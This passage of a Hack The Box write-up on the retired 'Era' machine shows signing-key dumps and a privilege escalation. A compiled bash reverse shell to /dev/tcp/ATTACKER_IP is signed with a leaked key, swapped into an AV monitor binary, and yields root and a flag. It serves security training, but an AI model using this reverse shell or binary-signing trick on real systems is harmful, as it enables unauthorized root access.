        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    00:aa:28:7d:f4:f9:16:63:93:18:95:24:c9:ee:07:
                    a6:f5:74:36:d6:51:ac:37:a7:64:32:42:f5:8c:6c:
                    5b:ec:8b:bc:c6:d6:41:36:2c:1a:ca:8e:c1:32:bd:
                    cc:68:f2:6d:30:2f:d7:de:b8:58:8e:95:c8:83:31:
                    a9:84:2c:c0:16:d1:48:cc:c9:ec:34:d7:e4:be:6c:
                    01:1c:39:ac:07:f3:56:d5:6a:1c:4d:90:0e:21:1e:
                    2f:5d:fe:bc:ac:4d:ef:dd:9c:d9:21:d3:c2:a0:1e:
                    1c:c5:99:30:29:8d:b5:74:31:0c:14:0c:e2:d7:4b:
                    0f:5e:1d:df:b5:54:90:a5:c2:1c:00:b0:be:31:76:
                    4e:29:41:2e:9d:02:e2:44:9f:1d:c8:cc:da:10:db:
                    77:fe:74:fa:93:08:c0:00:59:24:fa:ed:53:d9:8d:
                    28:f0:5b:5f:c7:1c:d8:b5:d9:e3:de:c0:42:51:18:
                    1f:b6:2b:e6:1e:1a:3f:a5:c5:28:56:fc:8d:63:60:
                    41:e7:b0:ea:e5:88:cd:a1:66:f3:8b:a9:2f:4b:8e:
                    1a:9f:23:df:90:d5:1c:48:40:5e:bd:c8:01:14:78:
                    de:25:62:ea:5a:d0:68:6b:da:1f:7a:60:b4:44:e5:
                    8c:97:68:1c:5d:48:0e:20:2c:63:95:1d:98:0c:97:
                    68:bf
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Basic Constraints: critical
                CA:FALSE
            X509v3 Key Usage:
                Digital Signature
            X509v3 Subject Key Identifier:
                FD:76:05:FC:BC:D6:04:CA:FE:36:16:70:FC:F1:D4:95:01:DB:D2:CD
    Signature Algorithm: sha256WithRSAEncryption
    Signature Value:
        0c:c4:78:d4:31:20:91:fa:67:cb:ce:bc:ff:20:d4:ea:32:0f:
        43:ad:f4:4f:14:fc:f7:71:94:ce:d0:5a:a9:3d:a9:c1:f4:c7:
        24:19:aa:0e:c4:7b:92:ff:92:ae:32:ff:58:b5:67:10:0f:94:
        17:ce:53:1e:0a:85:98:16:56:44:ad:7e:fb:ad:d0:89:60:dd:
        54:97:56:7b:4f:3d:18:bc:58:07:03:57:99:e2:bd:8b:69:86:
        fd:7a:65:09:1a:72:51:72:74:dd:26:61:07:36:36:5a:83:bf:
        ec:b9:14:a9:c6:6e:48:a8:45:45:46:1a:69:08:a9:e6:93:e0:
        72:14:03:60:85:46:74:eb:d8:96:a8:d1:3c:00:20:6d:23:7e:
        9a:2f:fb:2f:ed:d9:68:54:36:da:3d:2f:4e:2f:70:3d:d9:03:
        3b:84:3d:99:ea:b3:f2:fd:ae:ca:03:67:51:1e:dc:3c:67:38:
        2e:e5:dc:f9:24:95:a2:22:0e:b5:e2:1c:09:1d:36:b8:3b:37:
        d5:c2:79:0a:f4:15:44:b4:c4:b3:01:31:50:84:25:3d:93:0a:
        8e:a5:5c:ab:5c:23:90:39:16:00:1c:c8:40:83:ce:4c:3e:1d:
        d8:12:60:53:da:a1:82:6a:e6:bc:47:fb:18:6e:0e:a4:43:af:
        de:35:4a:0e

fcoomans@kali:~/htb/era/loot/signing$ openssl pkey -in key.pem -text -noout
Private-Key: (2048 bit, 2 primes)
modulus:
    00:aa:28:7d:f4:f9:16:63:93:18:95:24:c9:ee:07:
    a6:f5:74:36:d6:51:ac:37:a7:64:32:42:f5:8c:6c:
<SNIP>
```

### 🧪 Exploitation

#### 🐚 Reverse shell

I generate a `Bash -i` reverse shell using https://www.revshells.com

![](images/Pasted%20image%2020250729154654.png)

I create a temporary directory `/tmp/fc`.  I then create a `rev.c` C program that will run the reverse shell and compile it.

```
eric@era:~$ mkdir /tmp/fc

eric@era:~$ cd /tmp/fc

eric@era:/tmp/fc$ cat > rev.c <<EOF
cat > rev.c <<EOF
> #include <stdlib.h>
>
> int main() {
>     int i;
>
>     i = system("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4445 0>&1'");
>
>     return 0;
> }
EOF

eric@era:/tmp/fc$ cat rev.c

#include <stdlib.h>

int main() {
    int i;

    i = system("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4445 0>&1'");

    return 0;
}

eric@era:/tmp/fc$ gcc -o monitor rev.c
```

#### ✒️ Signing

I know that the `signing.zip` file is located under `/var/www/file/files/`.  The file is copied to the temp directory and unzipped.

```
eric@era:/tmp/fc$ cp /var/www/file/files/signing.zip .

eric@era:/tmp/fc$ unzip signing.zip

Archive:  signing.zip
  inflating: key.pem
  inflating: x509.genkey
```

The private key and certificate are extracted from the `key.pem` file and stored in its own file.

```
eric@era:/tmp/fc$ cat key.pem | sed -n '/-----BEGIN PRIVATE KEY-----/,/-----END PRIVATE KEY-----/p' > yurivich.key
<-----/,/-----END PRIVATE KEY-----/p' > yurivich.key
eric@era:/tmp/fc$ cat key.pem | sed -n '/-----BEGIN CERTIFICATE-----/,/-----END CERTIFICATE-----/p' > yurivich.crt
<-----/,/-----END CERTIFICATE-----/p' > yurivich.crt
```


`openssl cms` is used to sign `monitor` with the certificate and key.  Note that the `-noattr -nocerts` flags are critical.

```
eric@era:/tmp/fc$ openssl cms -sign -in monitor -out signature -signer yurivich.crt -inkey key.pem -binary -outform DER -noattr -nocerts
```

The `signature` is then added to the `.text_sig` section and the signed file is named `signed_monitor`.

```
eric@era:/tmp/fc$ objcopy --add-section .text_sig=signature monitor signed_monitor

```

A `nc` listener is started on the attack host.

```
fcoomans@kali:~/htb/era/signing$ rlwrap nc -lvnp 4445
listening on [any] 4445 ...
```

And `/opt/AV/periodic-checks/monitor` is replaced with the malicious `signed_monitor` file.

```
eric@era:/tmp/fc$ cp signed_monitor /opt/AV/periodic-checks/monitor
```

The reverse shell is caught by the `nc` listener.

```
fcoomans@kali:~/htb/era/signing$ rlwrap nc -lvnp 4445
listening on [any] 4445 ...
connect to [ATTACKER_IP] from (UNKNOWN) [10.10.11.79] 49750
bash: cannot set terminal process group (7036): Inappropriate ioctl for device
bash: no job control in this shell
root@era:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### 💰 Post Exploitation

#### 🏆 root.txt

`root` is the holder of the `root.txt` flag.

```
root@era:~# cat /root/root.txt
703f1322bd20ac361ee37b331b175df1
```

When your reverse shell passes signature verification, you're not hacking — you're **complying**. 🐚✒️

And `Era has been Pwned!` 🎉

![](images/Pasted%20image%2020250728221355.png)

## 🧠 Lessons Learned

- Virtual host fuzzing can uncover critical hidden functionality, especially when the main site appears static.
- Insecure direct object references (IDOR) remain a common and severe vulnerability when developers assume obscurity equals security.
- Exposed backups are a goldmine—credentials, source code, and even private keys may be hiding inside.
- The `ssh2` PHP extension can lead to shell access when paired with functionality like `ssh2.exec()` and developer slip-ups in input validation.
- Password reuse or storing hashes in publicly exposed files makes privilege escalation trivial.
- Signed executables aren’t secure if the signing key and certificate are leaked—signature validation is only as good as the secrecy of the signer’s credentials.

## ⚠️ Disclaimer

This write-up covers a retired HTB machine and is for educational purposes only. All IPs, credentials, and flags exist in a lab environment. My username is intentionally used throughout this write-up to build my cybersecurity brand.

